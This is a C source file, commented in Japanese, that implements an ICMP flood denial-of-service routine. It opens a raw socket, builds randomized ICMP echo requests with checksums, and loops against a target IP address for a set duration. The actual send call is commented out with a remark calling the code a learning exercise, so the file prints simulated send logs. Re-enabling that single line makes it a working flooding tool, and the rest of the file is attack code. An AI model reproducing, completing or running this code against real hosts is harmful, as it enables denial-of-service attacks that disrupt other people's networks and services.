#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#include "icmp_flood.h"

// ★ ICMPチェックサム計算
unsigned short checksum(void *b, int len)
{
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for(sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if(len == 1)
        sum += *(unsigned char*)buf;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

void icmp_flood(const char *target, int duration)
{
    printf("[ICMP Flood] Target: %s  Duration: %d sec\n", target, duration);

    // ★ raw socket 構造（安全のため sendto は行わない）
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("socket");
        return;
    }

    char packet[1024];
    struct icmphdr *icmp = (struct icmphdr *)(packet);

    time_t start = time(NULL);

    while (time(NULL) - start < duration) {

        memset(packet, 0, sizeof(packet));

        // ========== ICMP Header ==========
        icmp->type = ICMP_ECHO;    // Echo Request
        icmp->code = 0;
        icmp->un.echo.id = rand() % 65535;
        icmp->un.echo.sequence = rand() % 65535;

        // Payload（ダミー）
        const char *data = "ICMP Flood Test Payload";
        memcpy(packet + sizeof(struct icmphdr), data, strlen(data));

        int packet_len = sizeof(struct icmphdr) + strlen(data);

        // チェックサム
        icmp->checksum = 0;
        icmp->checksum = checksum(icmp, packet_len);

        // 送信先構造体
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(target);

        // ★ 本番なら sendto(sock, ...) するが、学習用なので送信しない
        // sendto(sock, packet, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest));

        // 疑似送信ログ
        printf("Sending ICMP Echo to %s  id=%d seq=%d\n",
            target,
            ntohs(icmp->un.echo.id),
            ntohs(icmp->un.echo.sequence)
        );
    }

    close(sock);

    printf("[ICMP Flood] Completed\n");
}
